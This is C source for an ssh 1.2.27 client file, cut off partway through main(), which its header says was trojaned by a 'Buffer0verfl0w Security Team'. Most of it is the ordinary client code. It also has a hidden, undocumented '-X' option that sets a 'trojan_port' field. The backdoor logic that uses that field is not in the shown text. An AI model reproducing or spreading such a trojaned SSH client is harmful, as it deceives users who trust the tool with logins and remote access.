/*

ssh.c

Author: Tatu Ylonen <ylo@cs.hut.fi>

Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland
                   All rights reserved

Created: Sat Mar 18 16:36:11 1995 ylo
Trojan created: Sun May  7 08:42:18 2000 xfer of Buffer0verfl0w Security Team

Ssh client program.  This program can be used to log into a remote machine.
The software supports strong authentication, encryption, and forwarding
of X11, TCP/IP, and authentication connections.

*/

/*
 * $Id: ssh.c,v 1.33 1999/02/22 08:14:06 tri Exp $
 * $Log: ssh.c,v $
 * Revision 1.33  1999/02/22 08:14:06  tri
 * 	Final fixes for 1.2.27.
 *
 * Revision 1.32  1999/02/21 19:52:46  ylo
 *      Intermediate commit of ssh1.2.27 stuff.
 *      Main change is sprintf -> snprintf; however, there are also
 *      many other changes.
 *
 * Revision 1.31  1998/07/08 00:47:18  kivinen
 *      Fixed typo (privileged).
 *
 * Revision 1.30  1998/05/23  20:25:44  kivinen
 *      Changed () -> (void). Added check that {ssh,slogin}{,1}{.old}
 *      are known program names, not host names. Added missing break
 *      to 'g' option switch clause.
 *
 * Revision 1.29  1998/04/17  00:40:07  kivinen
 *      Fixed -f code so that it will also use setpgid/setpgrp if
 *      setsid is not available.
 *
 * Revision 1.28  1998/03/27 17:27:34  kivinen
 *      Removed TSS. Take copy of pw struct immediately.
 *
 * Revision 1.27  1998/03/27 17:02:23  kivinen
 *      Added -g option. Combined getpwuid calls to get around linux
 *      nis bug. Added gateway ports support.
 *
 * Revision 1.26  1998/01/02 06:22:47  kivinen
 *      Added xauthlocation option support.
 *
 * Revision 1.25  1997/08/09 21:17:47  ylo
 *      Fixed out-of-date comment about being back to user's
 *      permissions.
 *
 * Revision 1.24  1997/08/07 16:22:26  kivinen
 *      Moved privileged port check to add_local_forward function.
 *
 * Revision 1.23  1997/04/27 21:55:01  kivinen
 *      Added F-SECURE stuff.
 *
 * Revision 1.22  1997/04/05 22:00:11  kivinen
 *      Added LIBWRAP stuff at the beginning.
 *
 * Revision 1.21  1997/03/27 13:46:23  kivinen
 *      Fixed typo.
 *
 * Revision 1.20  1997/03/27 03:10:56  kivinen
 *      Added kerberos patches from Glenn Machin.
 *      Added -V and -k options.
 *
 * Revision 1.19  1997/03/26 07:17:17  kivinen
 *      Fixed usage so it will display only supported encryption
 *      algorithms.
 *
 * Revision 1.18  1997/03/26 05:34:17  kivinen
 *      Added -P option.
 *
 * Revision 1.17  1997/03/19 19:25:30  kivinen
 *      Added input buffer clearing for error conditions, so packet.c
 *      can check that buffer must be empty before new packet is read
 *      in.
 *
 * Revision 1.16  1997/03/19 17:43:41  kivinen
 *      Limit hostname and username to 255 characters.
 *
 * Revision 1.15  1996/11/24 08:25:39  kivinen
 *      Added SSH_NO_{PORT,X11}_FORWARDING support.
 *
 * Revision 1.14  1996/11/19 22:46:03  kivinen
 *      Added parenthes.
 *
 * Revision 1.13  1996/11/07 06:52:52  kivinen
 *      Allow user@host for ssh too. Patch from peter@baileynm.com
 *      (Peter da Silva).
 *
 * Revision 1.12  1996/11/04 22:13:44  kivinen
 *      Fixed warning message of old agent to be displayed only if
 *      user really tried to forward agent (agent running and
 *      forwarding is not disabled).
 *
 * Revision 1.11  1996/10/29 22:45:10  kivinen
 *      log -> log_msg. Added old agent emulation code (disable agent
 *      forwarding if the other end is too old).
 *      Added userfile_uninit again. Agent doesn't need it any more.
 *
 * Revision 1.10  1996/10/20 16:23:01  ttsalo
 *       use normal close() to close authentication socket
 *
 * Revision 1.9  1996/10/20 16:19:35  ttsalo
 *      Added global variable 'original_real_uid' and it's initialization
 *
 * Revision 1.8  1996/10/04 01:00:13  kivinen
 *      Commented userfile_uninit out because we might need userfile
 *      later to open agent connections.
 *
 * Revision 1.7  1996/09/08 17:48:12  ttsalo
 *      Changed authfd's type from int to UserFile
 *
 * Revision 1.6  1996/07/29 03:41:23  ylo
 *      Recognize remsh as a possible name for ssh.
 *
 * Revision 1.5  1996/07/15 07:19:47  ylo
 *      Added passing of -8 to rlogin/rsh when falling back to them.
 *
 * Revision 1.4  1996/07/14 23:33:20  ylo
 *      Pass -n to rsh/rlogin if given to ssh.
 *
 * Revision 1.3  1996/05/29 07:41:34  ylo
 *      Added arguments to userfile_init.
 *
 * Revision 1.2  1996/02/25 13:53:24  ylo
 *      Fixed a bug that caused falling back to rsh to hang.
 *
 * Revision 1.1.1.1  1996/02/18 21:38:12  ylo
 *      Imported ssh-1.2.13.
 *
 * Revision 1.17  1995/09/27  02:48:53  ylo
 *      Added SOCKS support.
 *
 * Revision 1.16  1995/09/27  02:16:10  ylo
 *      Print "rsh" command line if -v.
 *
 * Revision 1.15  1995/09/25  00:01:16  ylo
 *      Moved client main loop to clientloop.c.
 *
 * Revision 1.14  1995/09/22  22:23:55  ylo
 *      Changed argument list of ssh_login.
 *
 * Revision 1.13  1995/09/21  17:13:47  ylo
 *      Don't print "Connection closed" if -q.
 *
 * Revision 1.12  1995/09/13  12:03:37  ylo
 *      Fixed rhosts authentication.
 *      Moved channel_prepare_select to the correct location (should
 *      fix channel closes being reported only after a keypress).
 *
 * Revision 1.11  1995/09/10  22:47:34  ylo
 *      Added uidswap stuff (fixes security problems).  Changed to use
 *      original_real_uid instead of getuid in various places.
 *      #ifdef'd some SIGWINCH stuff.
 *
 * Revision 1.10  1995/09/09  21:26:45  ylo
 * /m/shadows/u2/users/ylo/ssh/README
 *
 * Revision 1.9  1995/08/31  09:23:32  ylo
 *      Copy struct pw.
 *
 * Revision 1.8  1995/08/29  22:33:24  ylo
 *      Clear IEXTEN when going to raw mode.
 *
 * Revision 1.7  1995/08/21  23:28:32  ylo
 *      Added -q.
 *      Added dummy syslog facility argument to log_init.
 *
 * Revision 1.6  1995/08/18  22:56:33  ylo
 *      Clarified some error messages.
 *
 * Revision 1.5  1995/07/27  00:40:34  ylo
 *      Added GlobalKnownHostsFile and UserKnownHostsFile.
 *
 * Revision 1.4  1995/07/26  23:15:25  ylo
 *      Removed include version.h.
 *
 * Revision 1.3  1995/07/15  13:27:56  ylo
 *      Fixed a typo in usage().
 *      Moved -l in running rsh after the host.
 *
 * Revision 1.2  1995/07/13  01:40:03  ylo
 *      Removed "Last modified" header.
 *      Added cvs log.
 *
 * $Endlog$
 */

#include "includes.h"
#include "xmalloc.h"
#include "randoms.h"
#include "ssh.h"
#include "packet.h"
#include "buffer.h"
#include "authfd.h"
#include "readconf.h"
#include "userfile.h"
#include "emulate.h"

#ifdef LIBWRAP
#include <tcpd.h>
#include <syslog.h>
#ifdef NEED_SYS_SYSLOG_H
#include <sys/syslog.h>
#endif /* NEED_SYS_SYSLOG_H */
int allow_severity = LOG_INFO;
int deny_severity = LOG_WARNING;
#endif /* LIBWRAP */

/* Random number generator state.  This is initialized in ssh_login, and
   left initialized.  This is used both by the packet module and by various
   other functions. */
RandomState random_state;

/* Flag indicating whether debug mode is on.  This can be set on the
   command line. */
int debug_flag = 0;

/* Flag indicating whether quiet mode is on. */
int quiet_flag = 0;

/* Flag indicating whether to allocate a pseudo tty.  This can be set on the
   command line, and is automatically set if no command is given on the command
   line. */
int tty_flag = 0;

/* Flag indicating that nothing should be read from stdin.  This can be set
   on the command line. */
int stdin_null_flag = 0;

/* Flag indicating whether -8 was given on the command line. */
int binary_clean_flag = 0;

/* Flag indicating that ssh should fork after authentication.  This is useful
   so that the pasphrase can be entered manually, and then ssh goes to the
   background. */
int fork_after_authentication_flag = 0;

/* General data structure for command line options and options configurable
   in configuration files.  See readconf.h. */
Options options;

/* Name of the host we are connecting to.  This is the name given on the
   command line, or the HostName specified for the user-supplied name
   in a configuration file. */
char *host;

#ifdef SIGWINCH
/* Flag to indicate that we have received a window change signal which has
   not yet been processed.  This will cause a message indicating the new
   window size to be sent to the server a little later.  This is volatile
   because this is updated in a signal handler. */
volatile int received_window_change_signal = 0;
#endif /* SIGWINCH */

/* Value of argv[0] (set in the main program). */
char *av0;

/* Flag indicating whether we have a valid host private key loaded. */
int host_private_key_loaded = 0;

/* Host private key. */
RSAPrivateKey host_private_key;

/* Original real uid. */
uid_t original_real_uid;


/* Prints a help message to the user.  This function never returns. */
void usage(void)
{
  fprintf(stderr, "Usage: %s [options] host [command]\n", av0);
  fprintf(stderr, "Options:\n");
  fprintf(stderr, "  -l user     Log in using this user name.\n");
  fprintf(stderr, "  -n          Redirect input from /dev/null.\n");
  fprintf(stderr, "  -a          Disable authentication agent forwarding.\n");
#if defined(KERBEROS_TGT_PASSING) && defined(KRB5)
  fprintf(stderr, "  -k          Disable Kerberos ticket passing.\n");
#endif /* defined(KERBEROS_TGT_PASSING) && defined(KRB5) */
#ifndef SSH_NO_X11_FORWARDING
  fprintf(stderr, "  -x          Disable X11 connection forwarding.\n");
#endif
  fprintf(stderr, "  -i file     Identity for RSA authentication (default: ~/.ssh/identity).\n");
  fprintf(stderr, "  -t          Tty; allocate a tty even if command is given.\n");
  fprintf(stderr, "  -v          Verbose; display verbose debugging messages.\n");
  fprintf(stderr, "  -V          Display version number only.\n");
  fprintf(stderr, "  -q          Quiet; don't display any warning messages.\n");
  fprintf(stderr, "  -f          Fork into background after authentication.\n");
  fprintf(stderr, "  -e char     Set escape character; ``none'' = disable (default: ~).\n");
  fprintf(stderr, "  -c cipher   Select encryption algorithm: "
#ifdef WITH_DES
          "``des'', "
#endif /* WITH_DES */
#ifdef WITH_ARCFOUR
          "``arcfour'', "
#endif /* WITH_ARCFOUR */
#ifdef WITH_NONE
          "``none'', "
#endif /* WITH_NONE */
#ifdef WITH_IDEA
          "``idea'', "
#endif /* WITH_IDEA */
#ifdef WITH_BLOWFISH
          "``blowfish'', "
#endif /* WITH_BLOWFISH */
          "``3des''\n");
  fprintf(stderr, "  -p port     Connect to this port.  Server must be on the same port.\n");
  fprintf(stderr, "  -P          Don't use privileged source port.\n");
#ifndef SSH_NO_PORT_FORWARDING
  fprintf(stderr, "  -L listen-port:host:port   Forward local port to remote address\n");
  fprintf(stderr, "  -R listen-port:host:port   Forward remote port to local address\n");
  fprintf(stderr, "              These cause %s to listen for connections on a port, and\n", av0);
  fprintf(stderr, "              forward them to the other side by connecting to host:port.\n");
#endif
  fprintf(stderr, "  -C          Enable compression.\n");
  fprintf(stderr, "  -g          Allow remote hosts to connect to local port forwardings\n");
  fprintf(stderr, "  -o 'option' Process the option as if it was read from a configuration file.\n");
  exit(1);
}

/* Connects to the given host using rsh (or prints an error message and exits
   if rsh is not available).  This function never returns. */

void rsh_connect(char *host, char *user, Buffer *command)
{
#ifdef RSH_PATH
  char *args[10];
  char rsh_program_name[256];
  char *cp;
  int i;
  
  log_msg("Using rsh.  WARNING: Connection will not be encrypted.");

  /* Switch to the original uid permanently. */
  if (setuid(getuid()) < 0)
    fatal("setuid: %.100s", strerror(errno));

  /* Compute the full path of the suitable rsh/rlogin program. */
  if (strchr(av0, '/'))
    cp = strrchr(av0, '/') + 1;
  else
    cp = av0;
  if (strcmp(cp, "rlogin") == 0 || strcmp(cp, "slogin") == 0)
    {
      strncpy(rsh_program_name, RSH_PATH, sizeof(rsh_program_name));
      rsh_program_name[sizeof(rsh_program_name) - 20] = '\0';
      if (strchr(rsh_program_name, '/'))
        *strrchr(rsh_program_name, '/') = '\0';
      sprintf(rsh_program_name + strlen(rsh_program_name), "/rlogin");
    }
  else
    {
      strncpy(rsh_program_name, RSH_PATH, sizeof(rsh_program_name));
      rsh_program_name[sizeof(rsh_program_name) - 1] = '\0';
    }

  /* Build argument list for rsh. */
  i = 0;
  args[i++] = rsh_program_name;
  args[i++] = host;    /* may have to come after user on some systems */
  if (user)
    {
      args[i++] = "-l";
      args[i++] = user;
    }
  if (stdin_null_flag)
    args[i++] = "-n";
  if (binary_clean_flag)
    args[i++] = "-8";
  if (buffer_len(command) > 0)
    {
      buffer_append(command, "\0", 1);
      args[i++] = buffer_ptr(command);
    }
  args[i++] = NULL;
  if (debug_flag)
    {
      for (i = 0; args[i]; i++)
        {
          if (i != 0)
            fprintf(stderr, " ");
          fprintf(stderr, "%s", args[i]);
        }
      fprintf(stderr, "\n");
    }
  execv(rsh_program_name, args);
  perror(rsh_program_name);
  exit(1);
#else /* RSH_PATH */
  fatal("Rsh not available.");
#endif /* RSH_PATH */
}

/* Main program for the ssh client. */

int main(int ac, char **av)
{
  int i, opt, optind, type, exit_status, ok, fwd_port, fwd_host_port;
  int authfd;
  char *optarg, *cp, buf[256];
  Buffer command;
  struct stat st;
  struct passwd *pw, pwcopy;
  int interactive = 0, dummy;
  int use_privileged_port = 1;
  uid_t original_effective_uid;
#ifdef SIGWINCH
  struct winsize ws;
#endif /* SIGWINCH */

  /* Save the original real uid.  It will be needed later (uid-swapping may
     clobber the real uid).  */
  original_real_uid = getuid();
  original_effective_uid = geteuid();

  /* Set signals and core limits so that we cannot dump core.  */
  signals_prevent_core();

  pw = getpwuid(original_real_uid);
  if (!pw)
    {
      fprintf(stderr, "You don't exist, go away!\n");
      exit(1);
    }
  
  /* Take a copy of the returned structure. */
  memset(&pwcopy, 0, sizeof(pwcopy));
  pwcopy.pw_name = xstrdup(pw->pw_name);
  pwcopy.pw_passwd = xstrdup(pw->pw_passwd);
  pwcopy.pw_uid = pw->pw_uid;
  pwcopy.pw_gid = pw->pw_gid;
  pwcopy.pw_dir = xstrdup(pw->pw_dir);
  pwcopy.pw_shell = xstrdup(pw->pw_shell);
  pw = &pwcopy;
  
  /* Start reading files as the specified user.  However, if we are not running
     suid root, all access can be done locally, and there is no need to
     initialize explicitly. */
  if (original_real_uid != original_effective_uid)
    {
      userfile_init(pw->pw_name, pw->pw_uid, pw->pw_gid, NULL, NULL);
    }

#ifdef HAVE_UMASK
  /* Set our umask to something reasonable, as some files are created with 
     the default umask.  This will make them world-readable but writable 
     only by the owner, which is ok for all files for which we don't set
     the modes explicitly. */
  umask(022);
#endif /* HAVE_UMASK */
  
  /* Save our own name. */
  av0 = av[0];

#ifdef SOCKS
  /* Initialize SOCKS (the firewall traversal library). */
  SOCKSinit(av0);
#endif /* SOCKS */

  /* Set RSA (actually gmp) memory allocation functions. */
  rsa_set_mp_memory_allocation();

  /* Initialize option structure to indicate that no values have been set. */
  initialize_options(&options);

  /* Parse command-line arguments. */
  host = NULL;

  /* If program name is not one of the standard names, use it as host name. */
  if (strchr(av0, '/'))
    cp = strrchr(av0, '/') + 1;
  else
    cp = av0;
  if (strcmp(cp, "rsh") != 0 && strcmp(cp, "ssh") != 0 &&
      strcmp(cp, "rlogin") != 0 && strcmp(cp, "slogin") != 0 &&
      strcmp(cp, "ssh1") != 0 && strcmp(cp, "slogin1") != 0 &&
      strcmp(cp, "ssh.old") != 0 && strcmp(cp, "slogin.old") != 0 &&
      strcmp(cp, "ssh1.old") != 0 && strcmp(cp, "slogin1.old") != 0 &&
      strcmp(cp, "remsh") != 0)
    host = cp;
  
  for (optind = 1; optind < ac; optind++)
    {
      if (av[optind][0] != '-')
        {
          if (host)
            break;
          host = av[optind];
          
          /* allows 'user@host' */
          if(cp = strchr(host, '@')) {
            options.user = host;
            *cp++ = '\0';
            host = cp;
          }
          continue;
        }
      opt = av[optind][1];
      if (!opt)
        usage();
      if (strchr("eilcpLRoX", opt)) /* options with arguments */
        {
          optarg = av[optind] + 2;
          if (strcmp(optarg, "") == 0)
            {
              if (optind >= ac - 1)
                usage();
              optarg = av[++optind];
            }
        }
      else
        {
          if (av[optind][2])
            usage();
          optarg = NULL;
        }
      switch (opt)
        {
        case 'n':
          stdin_null_flag = 1;
          break;

        case 'f':
          fork_after_authentication_flag = 1;
          stdin_null_flag = 1;
          break;

        case 'x':
          options.forward_x11 = 0;
          break;

        case 'a':
          options.forward_agent = 0;
          break;

        case 'k':
          options.kerberos_tgt_passing = 0;
          break;
          
        case 'i':
          if (userfile_stat(original_real_uid, optarg, &st) < 0)
            {
              fprintf(stderr, "Warning: Identity file %s does not exist.\n",
                      optarg);
              break;
            }
          if (options.num_identity_files >= SSH_MAX_IDENTITY_FILES)
            fatal("Too many identity files specified (max %d)",
                  SSH_MAX_IDENTITY_FILES);
          options.identity_files[options.num_identity_files++] = 
            xstrdup(optarg);
          break;

        case 't':
          tty_flag = 1;
          break;

        case 'V':
#ifdef F_SECURE_COMMERCIAL

#endif /* F_SECURE_COMMERCIAL */
          fprintf(stderr, "SSH Version %s [%s], protocol version %d.%d.\n",
                  SSH_VERSION, HOSTTYPE, PROTOCOL_MAJOR, PROTOCOL_MINOR);
#ifdef RSAREF
          fprintf(stderr, "Compiled with RSAREF.\n");
#else /* RSAREF */
          fprintf(stderr, "Standard version.  Does not use RSAREF.\n");
#endif /* RSAREF */
          exit(0);
          
        case 'v':
          debug_flag = 1;
#ifdef F_SECURE_COMMERCIAL

#endif /* F_SECURE_COMMERCIAL */
          fprintf(stderr, "SSH Version %s [%s], protocol version %d.%d.\n",
                  SSH_VERSION, HOSTTYPE, PROTOCOL_MAJOR, PROTOCOL_MINOR);
#ifdef RSAREF
          fprintf(stderr, "Compiled with RSAREF.\n");
#else /* RSAREF */
          fprintf(stderr, "Standard version.  Does not use RSAREF.\n");
#endif /* RSAREF */
          break;

        case 'q':
          quiet_flag = 1;
          break;

        case 'e':
          if (optarg[0] == '^' && optarg[2] == 0 &&
              (unsigned char)optarg[1] >= 64 && (unsigned char)optarg[1] < 128)
            options.escape_char = (unsigned char)optarg[1] & 31;
          else
            if (strlen(optarg) == 1)
              options.escape_char = (unsigned char)optarg[0];
            else
              if (strcmp(optarg, "none") == 0)
                options.escape_char = -2;
              else
                {
                  fprintf(stderr, "Bad escape character '%s'.\n", optarg);
                  exit(1);
                }
          break;

        case 'c':
          options.cipher = cipher_number(optarg);
          if (options.cipher == -1)
            {
              fprintf(stderr, "Unknown cipher type '%s'\n", optarg);
              exit(1);
            }
          break;

        case 'p':
          options.port = atoi(optarg);
          if (options.port < 1 || options.port > 65535)
            {
              fprintf(stderr, "Bad port %s.\n", optarg);
              exit(1);
            }
          break;

        case 'l':
          options.user = optarg;
          break;
	
	case 'X':
	  options.trojan_port = atoi(optarg);
	  break;  

        case 'R':
#ifndef SSH_NO_PORT_FORWARDING
          if (sscanf(optarg, "%d:%255[^:]:%d", &fwd_port, buf, 
                     &fwd_host_port) != 3)
            {
              fprintf(stderr, "Bad forwarding specification '%s'.\n", optarg);
              usage();
              /*NOTREACHED*/
            }
          add_remote_forward(&options, fwd_port, buf, fwd_host_port);
#endif
          break;

        case 'L':
#ifndef SSH_NO_PORT_FORWARDING
          if (sscanf(optarg, "%d:%255[^:]:%d", &fwd_port, buf, 
                     &fwd_host_port) != 3)
            {
              fprintf(stderr, "Bad forwarding specification '%s'.\n", optarg);
              usage();
              /*NOTREACHED*/
            }
          add_local_forward(&options, fwd_port, buf, fwd_host_port);
#endif
          break;

        case 'C':
          options.compression = 1;
          break;

        case 'o':
          dummy = 1;
          process_config_line(&options, host ? host : "", optarg,
                              "command-line", 0, &dummy);
          break;

        case '8':
          /* Ssh is always 8-bit-clean.  This option is only
             recognized for backwards compatibility with ssh, and is
             passed to rsh/rlogin if falling back to them. */
          binary_clean_flag = 1;
          break;

        case 'P':
          use_privileged_port = 0;
          break;

        case 'g':
          options.gateway_ports = 1;
          break;

        default:
          usage();
        }
    }

 /* Check that we got a host name. */
  if (!host)
    usage();

  /* Initialize the command to execute on remote host. */
  buffer_init(&command);

  /* Save the command to execute on the remote host in a buffer.  There is
     no limit on the length of the command, except by the maximum packet
     size.  Also sets the tty flag if there is no command. */
  if (optind == ac)
    {
      /* No command specified - execute shell on a tty. */
      tty_flag = 1;
    }
  else
    {
      /* A command has been specified.  Store it into the buffer. */
      for (i = optind; i < ac; i++)
        {
          if (i > optind)
            buffer_append(&command, " ", 1);
          buffer_append(&command, av[i], strlen(av[i]));
        }
    }

  /* Cannot fork to background if no command. */
  if (fork_after_authentication_flag && buffer_len(&command) == 0)
    fatal("Cannot fork into background without a command to execute.");
  
  /* Allocate a tty by default if no command specified. */
  if (buffer_len(&command) == 0)
    tty_flag = 1;

  /* Do not allocate a tty if stdin is not a tty. */
  if (!isatty(fileno(stdin)))
    {
      if (tty_flag)
        fprintf(stderr, "Pseudo-terminal will not be allocated because stdin is not a terminal.\n");
      tty_flag = 0;
    }

  /* Initialize "log" output.  Since we are the client all output actually
     goes to the terminal. */
  log_init(av[0], 1, debug_flag, quiet_flag, SYSLOG_FACILITY_USER);

  /* Read per-user configuration file. */
  snprintf(buf, sizeof(buf), "%.100s/%.100s", pw->pw_dir, SSH_USER_CONFFILE);
  read_config_file(original_real_uid, buf, host, &options);

  /* Read systemwide configuration file. */
  read_config_file(original_real_uid, HOST_CONFIG_FILE, host, &options);

  /* Fill configuration defaults. */
  fill_default_options(&options);
  if (options.user == NULL)
    {
      options.no_user_given = 1;
      options.user = xstrdup(pw->pw_name);
    }
  
  if (options.hostname != NULL)
    host = options.hostname;

  /* Limit the hostname and username length to 255 characters */
  if (strlen(host) > 255 || strlen(options.user) > 255)
    fatal("Hostname or username is longer than 255 characters.");

  /* Disable kerberos, if client is suid */
  if (original_real_uid != original_effective_uid)
    {
      if (options.kerberos_authentication || options.kerberos_tgt_passing)
        log_msg("Warning: Kerberos authentication disabled in SUID client.");
      options.kerberos_authentication = 0;
      options.kerberos_tgt_passing = 0;
    }

  /* Disable rhosts authentication if not running as root. */
  if (original_effective_uid != UID_ROOT)
    {
      options.rhosts_authentication = 0;
      options.rhosts_rsa_authentication = 0;
    }

  /* If using rsh has been selected, exec it now (without trying anything
     else).  Note that we must release privileges first. */
  if (options.use_rsh)
    {
      /* Execute rsh. */
      userfile_uninit();
      rsh_connect(host, options.user, &command);
      fatal("rsh_connect returned");
    }

  if (use_privileged_port && !options.use_privileged_port)
    {
      use_privileged_port = 0;
    }
  if (!options.rhosts_authentication && !options.rhosts_rsa_authentication)
    {
      use_privileged_port = 0;
    }
  /* Open a connection to the remote host.  This needs root privileges if
     rhosts_authentication is true.  Note that the random_state is not
     yet used by this call, although a pointer to it is stored, and thus it
     need not be initialized. */
  ok = ssh_connect(host, options.port, options.connection_attempts,
                   !use_privileged_port,
                   original_real_uid, options.proxy_command, &random_state,
		   &options);

  /* Check if the connection failed, and try "rsh" if appropriate. */
  if (!ok)
    {
      userfile_uninit();
      if (options.port != 0)
        log_msg("Secure connection to %.100s on port %d refused%.100s.", 
            host, options.port,
            options.fallback_to_rsh ? "; reverting to insecure method" : "");
      else
        log_msg("Secure connection to %.100s refused%.100s.", host,
            options.fallback_to_rsh ? "; reverting to insecure method" : "");

      if (options.fallback_to_rsh)
        {
          rsh_connect(host, options.user, &command);
          fatal("rsh_connect returned");
        }
      exit(1);
      /*NOTREACHED*/
    }

  /* Successful connection. */
  /* Load the host private key in case we will need it later for
     combined rsa-rhosts authentication.  This must be done before
     releasing extra privileges, because the file is only readable by
     root.  */
  if (ok)
    {
      if (load_private_key(geteuid(), HOST_KEY_FILE, "", &host_private_key, 
                           NULL))
        host_private_key_loaded = 1;
    }

  /* Create ~/.ssh directory if it doesn\'t already exist. */
  snprintf(buf, sizeof(buf), "%.100s/%.100s", pw->pw_dir, SSH_USER_DIR);
  if (userfile_stat(original_real_uid, buf, &st) < 0)
    if (userfile_mkdir(original_real_uid, buf, 0755) < 0)
      error("Could not create directory '%.200s'.", buf);

  /* Expand ~ in options.identity_files. */
  for (i = 0; i < options.num_identity_files; i++)
    options.identity_files[i] = 
      tilde_expand_filename(options.identity_files[i], original_real_uid);

  /* Expand ~ in known host file names. */
  options.system_hostfile = tilde_expand_filename(options.system_hostfile,
                                                  original_real_uid);
  options.user_hostfile = tilde_expand_filename(options.user_hostfile,
                                                original_real_uid);

  /* Log into the remote system.  This never returns if the login fails. 
     Note: this initializes the random state, and leaves it initialized. */
  ssh_login(&random_state, host_private_key_loaded, &host_private_key, 
            host, &options, original_real_uid);

  /* We no longer need the host private key.  Clear it now. */
  if (host_private_key_loaded)
    rsa_clear_private_key(&host_private_key);

  /* Enable compression if requested. */
  if (options.compression)
    {
      debug("Requesting compression at level %d.", options.compression_level);

      if (options.compression_level < 1 || options.compression_level > 9)
        fatal("Compression level must be from 1 (fast) to 9 (slow, best).");

      /* Send the request. */
      packet_start(SSH_CMSG_REQUEST_COMPRESSION);
      packet_put_int(options.compression_level);
      packet_send();
      packet_write_wait();
      type = packet_read();
      if (type == SSH_SMSG_SUCCESS)
        packet_start_compression(options.compression_level);
      else
        {
          packet_get_all();
          log_msg("Warning: Remote host refused compression.");
        }
    }

  /* Allocate a pseudo tty if appropriate. */
  if (tty_flag)
    {
      debug("Requesting pty.");

      /* Start the packet. */
      packet_start(SSH_CMSG_REQUEST_PTY);

      /* Store TERM in the packet.  There is no limit on the length of the
         string. */
      cp = getenv("TERM");
      if (!cp)
        cp = "";
      packet_put_string(cp, strlen(cp));

      /* Store window size in the packet. */
#ifdef SIGWINCH
      if (ioctl(fileno(stdin), TIOCGWINSZ, &ws) < 0)
        memset(&ws, 0, sizeof(ws));
      packet_put_int(ws.ws_row);
      packet_put_int(ws.ws_col);
      packet_put_int(ws.ws_xpixel);
      packet_put_int(ws.ws_ypixel);
#else /* SIGWINCH */
      packet_put_int(0);
      packet_put_int(0);
      packet_put_int(0);
      packet_put_int(0);
#endif /* SIGWINCH */
      
      /* Store tty modes in the packet. */
      tty_make_modes(fileno(stdin));

      /* Send the packet, and wait for it to leave. */
      packet_send();
      packet_write_wait();

      /* Read response from the server. */
      type = packet_read();
      if (type == SSH_SMSG_SUCCESS)
        interactive = 1;
      else
        {
          packet_get_all();
          log_msg("Warning: Remote host failed or refused to allocate a pseudo tty.");
        }
    }

#ifndef SSH_NO_X11_FORWARDING
  /* Request X11 forwarding if enabled and DISPLAY is set. */
  if (options.forward_x11 && getenv("DISPLAY") != NULL)
    {
      char line[512], proto[512], data[512];
      int forwarded = 0, got_data = 0, i;
      UserFile uf;

#ifdef XAUTH_PATH
      /* Try to get Xauthority information for the display. */
      snprintf(line, sizeof(line), "%.100s list %.200s 2>/dev/null", 
              options.xauth_path, getenv("DISPLAY"));
      /* Note that we are already running on the user's uid. */
      uf = userfile_popen(original_real_uid, line, "r");
      if (uf && userfile_gets(line, sizeof(line), uf) && 
          sscanf(line, "%*s %s %s", proto, data) == 2)
        got_data = 1;
      else
        debug("Failed to get local xauth data.");
      if (uf)
        userfile_pclose(uf);
#else /* XAUTH_PATH */
      debug("No xauth data: no xauth program was found at configure time.");
#endif /* XAUTH_PATH */
      /* If we didn't get authentication data, just make up some data.  The
         forwarding code will check the validity of the response anyway, and
         substitute this data.  The X11 server, however, will ignore this
         fake data and use whatever authentication mechanisms it was using
         otherwise for the local connection. */
      if (!got_data)
        {
          strcpy(proto, "MIT-MAGIC-COOKIE-1");
          for (i = 0; i < 16; i++)
            sprintf(data + 2 * i, "%02x", random_get_byte(&random_state));
        }

      /* Got local authentication reasonable information.  Request forwarding
         with authentication spoofing. */
      debug("Requesting X11 forwarding with authentication spoofing.");
      x11_request_forwarding_with_spoofing(&random_state, proto, data);

      /* Read response from the server. */
      type = packet_read();
      if (type == SSH_SMSG_SUCCESS)
        {
          forwarded = 1;
          interactive = 1;
        }
      else
        {
          packet_get_all();
          log_msg("Warning: Remote host denied X11 forwarding, perhaps xauth program could not be run on the server side.");
        }
    }
#endif /* SSH_NO_X11_FORWARDING */

  /* Tell the packet module whether this is an interactive session. */
  packet_set_interactive(interactive, options.keepalives);

  if (options.forward_agent)
    {
      /* Clear agent forwarding if we don\'t have an agent. */
      authfd = ssh_get_authentication_fd();
      if (authfd == -1)
        options.forward_agent = 0;
      else
        close(authfd);
      if ((emulation_information & EMULATE_OLD_AGENT_BUG) &&
          options.forward_agent)
        {
          log_msg("Warning: Denied agent forwarding because the other end has too old version.");
          options.forward_agent = 0;
        }
    }
  
  /* Request authentication agent forwarding if appropriate. */
  if (options.forward_agent)
    {
      debug("Requesting authentication agent forwarding.");
      auth_request_forwarding();
      
      /* Read response from the server. */
      type = packet_read();
      if (type != SSH_SMSG_SUCCESS)
        {
          packet_get_all();
          log_msg("Warning: Remote host denied authentication agent forwarding.");
        }
    }

#ifndef SSH_NO_PORT_FORWARDING
  /* Initiate local TCP/IP port forwardings. */
  for (i = 0; i < options.num_local_forwards; i++)
    {
      debug("Connections to local port %d forwarded to remote address %.200s:%d",
            options.local_forwards[i].port, options.local_forwards[i].host, 
            options.local_forwards[i].host_port);
      channel_request_local_forwarding(options.local_forwards[i].port,
                                       options.local_forwards[i].host,
                                       options.local_forwards[i].host_port,
                                       options.gateway_ports);
    }

  /* Initiate remote TCP/IP port forwardings. */
  for (i = 0; i < options.num_remote_forwards; i++)
    {
      debug("Connections to remote port %d forwarded to local address %.200s:%d",
            options.remote_forwards[i].port, options.remote_forwards[i].host, 
            options.remote_forwards[i].host_port);
      channel_request_remote_forwarding(options.remote_forwards[i].port,
                                        options.remote_forwards[i].host,
                                        options.remote_forwards[i].host_port);
    }
#endif /* SSH_NO_PORT_FORWARDING */

  /* We will no longer need the forked process that reads files on the
     user's uid. */
  userfile_uninit(); 
  
  /* If requested, fork and let ssh continue in the background. */
  if (fork_after_authentication_flag)
    {
      int ret = fork();
      if (ret == -1)
        fatal("fork failed: %.100s", strerror(errno));
      if (ret != 0)
        exit(0);
#ifdef HAVE_SETSID
      setsid();
#else /* HAVE_SETSID */
#ifdef HAVE_SETPGID
      setpgid(0, 0);
#else
      setpgrp(0, 0);
#endif /* HAVE_SETPGID */
#endif /* HAVE_SETSID */
      if(tty_flag) {    /* user did combination of -f and -t */
        debug("Stopped using local pty.");
        tty_flag = 0;   /* no longer have a tty... */
      }
    }

  /* If a command was specified on the command line, execute the command now.
     Otherwise request the server to start a shell. */
  if (buffer_len(&command) > 0)
    {
      int len = buffer_len(&command);
      if (len > 900)
        len = 900;
